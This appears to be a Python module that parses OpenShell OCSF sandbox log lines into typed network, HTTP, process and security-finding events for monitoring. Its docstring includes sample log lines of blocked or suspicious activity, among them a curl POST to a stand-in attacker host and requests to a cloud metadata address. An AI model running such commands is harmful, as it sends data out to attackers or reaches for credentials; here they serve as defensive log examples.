"""Parse OpenShell OCSF log events from sandbox log lines.

Real OCSF message formats emitted by OpenShell (from openshell-ocsf/src/format/shorthand.rs):

  Network:
    NET:OPEN [INFO] ALLOWED curl(1618) -> audit.ext-log.com:443 [policy:default-egress engine:mechanistic]
    NET:OPEN [MED]  DENIED  curl(1618) -> audit.ext-log.com:443 [policy:- engine:opa] [reason:policy_denied: ...]
    NET:OPEN [MED]  DENIED  python3(42) -> 169.254.169.254:80   [policy:- engine:ssrf] [reason:trusted-gateway check failed]

  HTTP (when TLS is terminated — gives method + path):
    HTTP:GET   [INFO] ALLOWED curl(88) -> GET https://api.example.com/v1/data [policy:... engine:...]
    HTTP:OTHER [MED]  DENIED  python3(42) -> PUT http://169.254.169.254:80/latest/api/token [policy:- engine:opa]

  Process:
    PROC:LAUNCH    [INFO] python3(42) [cmd:python3 /workspace/exploit.py]
    PROC:TERMINATE [INFO] python3(42) [exit:0]
    PROC:LAUNCH    [INFO] curl(103)   [cmd:curl -X POST https://attacker.com]

  Security findings:
    FINDING:BLOCKED [HIGH] "NSSH1 Nonce Replay Attack"  [confidence:high]
    FINDING:BLOCKED [MED]  "Proxy Bypass Detected"      [confidence:high]
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field


# ---------------------------------------------------------------------------
# Message patterns (derived from openshell-ocsf/src/format/shorthand.rs)
# ---------------------------------------------------------------------------

_NET_PATTERN = re.compile(
    r"NET:\w+\s+\[\w+\]\s+(ALLOWED|DENIED)\s+(\S+)\s+->\s+([\w.\-]+):(\d+)",
    re.IGNORECASE,
)

_HTTP_PATTERN = re.compile(
    r"HTTP:(\w+)\s+\[\w+\]\s+(ALLOWED|DENIED)\s+\S+\s+->\s+(\w+)\s+(https?://\S+)",
    re.IGNORECASE,
)

_PROC_LAUNCH_PATTERN = re.compile(
    r"PROC:LAUNCH\s+\[\w+\]\s+(\S+)\((\d+)\)(?:\s+\[cmd:(.+?)\])?",
    re.IGNORECASE,
)

_PROC_TERMINATE_PATTERN = re.compile(
    r"PROC:TERMINATE\s+\[\w+\]\s+(\S+)\((\d+)\)(?:\s+\[exit:(-?\d+)\])?",
    re.IGNORECASE,
)

_FINDING_PATTERN = re.compile(
    r'FINDING:(\w+)\s+\[\w+\]\s+"([^"]+)"',
    re.IGNORECASE,
)


# ---------------------------------------------------------------------------
# Parsed event types
# ---------------------------------------------------------------------------

@dataclass
class NetworkEvent:
    action: str      # "ALLOWED" or "DENIED"
    process: str     # "curl(1618)"
    host: str        # "audit.ext-log.com"
    port: int
    endpoint: str    # "audit.ext-log.com:443"
    raw: str


@dataclass
class HttpEvent:
    action: str      # "ALLOWED" or "DENIED"
    method: str      # "GET", "POST", "PUT", etc.
    url: str
    raw: str


@dataclass
class ProcessEvent:
    event_type: str   # "launch" or "terminate"
    binary: str
    pid: int
    command: str | None
    exit_code: int | None
    raw: str


@dataclass
class FindingEvent:
    disposition: str  # "BLOCKED"
    title: str
    raw: str


@dataclass
class OCSFEvents:
    """All OCSF events parsed from a sandbox log window."""

    network_allowed: list[NetworkEvent] = field(default_factory=list)
    network_blocked: list[NetworkEvent] = field(default_factory=list)
    http_allowed: list[HttpEvent] = field(default_factory=list)
    http_blocked: list[HttpEvent] = field(default_factory=list)
    processes_launched: list[ProcessEvent] = field(default_factory=list)
    processes_terminated: list[ProcessEvent] = field(default_factory=list)
    findings: list[FindingEvent] = field(default_factory=list)

    @property
    def network_allowed_endpoints(self) -> list[str]:
        return [e.endpoint for e in self.network_allowed]

    @property
    def network_blocked_endpoints(self) -> list[str]:
        return [e.endpoint for e in self.network_blocked]

    @property
    def process_commands(self) -> list[str]:
        return [p.command for p in self.processes_launched if p.command]


def _parse_message(msg: str) -> NetworkEvent | HttpEvent | ProcessEvent | FindingEvent | None:
    """Parse a single OCSF shorthand message string into a typed event."""
    m = _NET_PATTERN.search(msg)
    if m:
        action, process, host, port = m.groups()
        return NetworkEvent(
            action=action.upper(), process=process, host=host,
            port=int(port), endpoint=f"{host}:{port}", raw=msg,
        )

    m = _HTTP_PATTERN.search(msg)
    if m:
        _, action, method, url = m.groups()
        return HttpEvent(action=action.upper(), method=method.upper(), url=url, raw=msg)

    m = _PROC_LAUNCH_PATTERN.search(msg)
    if m:
        binary, pid, command = m.groups()
        return ProcessEvent(event_type="launch", binary=binary, pid=int(pid), command=command, exit_code=None, raw=msg)

    m = _PROC_TERMINATE_PATTERN.search(msg)
    if m:
        binary, pid, exit_code = m.groups()
        return ProcessEvent(
            event_type="terminate", binary=binary, pid=int(pid), command=None,
            exit_code=int(exit_code) if exit_code is not None else None, raw=msg,
        )

    m = _FINDING_PATTERN.search(msg)
    if m:
        disposition, title = m.groups()
        return FindingEvent(disposition=disposition.upper(), title=title, raw=msg)

    return None


def parse_ocsf_lines(lines: list[str]) -> OCSFEvents:
    """Parse a list of OCSF shorthand message strings into an OCSFEvents aggregate."""
    result = OCSFEvents()
    for msg in lines:
        event = _parse_message(msg)
        if event is None:
            continue
        if isinstance(event, NetworkEvent):
            (result.network_allowed if event.action == "ALLOWED" else result.network_blocked).append(event)
        elif isinstance(event, HttpEvent):
            (result.http_allowed if event.action == "ALLOWED" else result.http_blocked).append(event)
        elif isinstance(event, ProcessEvent):
            (result.processes_launched if event.event_type == "launch"
             else result.processes_terminated).append(event)
        elif isinstance(event, FindingEvent):
            result.findings.append(event)
    return result
